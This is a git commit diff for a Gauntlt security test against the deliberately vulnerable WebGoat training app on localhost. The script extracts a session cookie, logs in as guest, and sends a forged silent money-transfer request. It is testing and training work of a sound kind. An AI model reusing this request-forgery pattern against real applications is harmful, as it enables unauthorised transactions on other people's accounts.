c9d6f366b9cd4e1cca610e1202827c674f30e8d7
root <root@localhost.localdomain>
2015-12-08 21:26:54 +0100

    we got da cookie

--- examples/webgoat/vuln-41/README.md
+++ examples/webgoat/vuln-41/README.md
@@ -1,6 +1,11 @@
 TEST vuln-41.attack
 
-This is a Gauntlt Test to check if the vulnerability in WebGoat located at General => Http Basics (vuln-00) exists.
+Installing Python Requests library
+- git clone git://github.com/kennethreitz/requests.git
+- cd requests
+- python setup.py install
+
+This is a Gauntlt Test to check if the vulnerability in WebGoat located at AJAX Security  => Silent Transactions Attacks (vuln-41) exists.
 
 It will return a 
 - 1 (error) if a vulnerability exists
--- examples/webgoat/vuln-41/attack.py
+++ examples/webgoat/vuln-41/attack.py
@@ -1,11 +1,16 @@
-import request
+import requests
 
 r = requests.get('http://127.0.0.1:8080/WebGoat/')
-r = requests.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check/jsessionid=TODOsessionid", data = {"username":"guest", "password":"guest"})
+dict =  r.headers
+cookie = dict['Set-Cookie']
+sessionID = cookie[11:43]
+print sessionID
+
+r = requests.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check/jsessionid=" + sessionID, data = {"username":"guest", "password":"guest"})
 
 r = requests.get("http://127.0.0.1:8080/WebGoat/attack?Screen=146&menu=400&from=ajax&newAccount=1337&amount=12345&confirm=Confirm")
 
 try:
-    print r
+	print r
 except Exception as e:
-    print e
+	print e
